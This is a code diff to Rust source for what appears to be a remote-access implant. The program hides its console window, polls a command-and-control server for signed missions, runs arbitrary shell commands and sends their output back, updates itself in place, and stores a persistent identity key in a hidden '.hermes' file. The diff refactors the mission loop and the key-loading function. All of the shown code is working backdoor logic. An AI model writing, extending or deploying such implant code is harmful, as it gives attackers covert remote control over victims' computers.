@@ -1,5 +1,5 @@
 #![windows_subsystem = "windows"]
-use std::{env, fs, thread, time};
+use std::{env, fs, path::Path, thread, time};
 
 // use arti_client::{TorClient, TorClientConfig};
 // use arti_hyper::ArtiHttpConnector;
@@ -88,43 +88,50 @@ fn failsafe_loop(
     agent_path: &std::path::Path,
 ) -> AgentResult<()> {
     loop {
-        match client::missions::get_next(signing_key, &c2_verifying_key) {
-            Ok(mission) => {
-                if let Some(mission) = mission {
-                    match &mission.task {
-                        model::Task::Update(data) => {
-                            info!("Updating agent '{}'", agent_path.display());
-                            let new_agent_path = agent_path.with_file_name("agent.new");
-                            fs::write(&new_agent_path, data)?;
-                            self_replace::self_replace(&new_agent_path)?;
-                            fs::remove_file(&new_agent_path)?;
-                            platform::execute_detached(&agent_path, mission)
-                                .expect("Failed to restart the agent");
-                            break;
-                        }
-                        model::Task::Execute(command) => {
-                            info!("Executing command: {command}");
-                            let output = match platform::execute_cmd(command) {
-                                Ok(output) => output.stdout,
-                                Err(e) => e.to_string().as_bytes().to_vec(),
-                            };
-                            client::missions::report(
-                                signing_key,
-                                mission,
-                                &String::from_utf8(output).unwrap(),
-                            )?;
-                        }
-                        model::Task::Stop => {
-                            client::missions::report(signing_key, mission, "OK")?;
-                            break;
-                        }
-                    }
+        if let Some(mission) = client::missions::get_next(signing_key, &c2_verifying_key)? {
+            match &mission.task {
+                model::Task::Update(data) => {
+                    info!("Updating agent '{}'", agent_path.display());
+                    let new_agent_path = agent_path.with_file_name("agent.new");
+                    fs::write(&new_agent_path, data)?;
+                    self_replace::self_replace(&new_agent_path)?;
+                    fs::remove_file(&new_agent_path)?;
+                    platform::execute_detached(&agent_path, mission)
+                        .expect("Failed to restart the agent");
+                    break;
+                }
+                model::Task::Execute(command) => {
+                    info!("Executing command: {command}");
+                    let output = match platform::execute_cmd(command) {
+                        Ok(output) => output.stdout,
+                        Err(e) => e.to_string().as_bytes().to_vec(),
+                    };
+                    client::missions::report(
+                        signing_key,
+                        mission,
+                        &String::from_utf8(output).unwrap(),
+                    )?;
+                }
+                model::Task::Stop => {
+                    client::missions::report(signing_key, mission, "OK")?;
+                    break;
                 }
             }
-            Err(e) => error!("Error: {e}"),
         }
     }
     Ok(())
+}
+
+pub fn signing_key() -> AgentResult<crypto::SigningKey> {
+    let signing_key_path = dirs::data_local_dir().unwrap().join(Path::new(".hermes"));
+    let signing_key = if Path::new(&signing_key_path).exists() {
+        crypto::get_signing_key_from(fs::read(&signing_key_path)?.as_slice().try_into().unwrap())
+    } else {
+        let signing_key = crypto::get_signing_key();
+        fs::write(&signing_key_path, signing_key.as_bytes())?;
+        signing_key
+    };
+    Ok(signing_key)
 }
 
 fn main() -> AgentResult<()> {
@@ -141,7 +148,7 @@ fn main() -> AgentResult<()> {
     info!("░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░ ");
     let agent_path = env::current_exe()?;
 
-    let mut signing_key = platform::signing_key()?;
+    let mut signing_key = signing_key()?;
     let c2_verifying_key = crypto::VerifyingKey::from_bytes(
         BASE64_STANDARD
             .decode(C2_VERIFYING_KEY)?
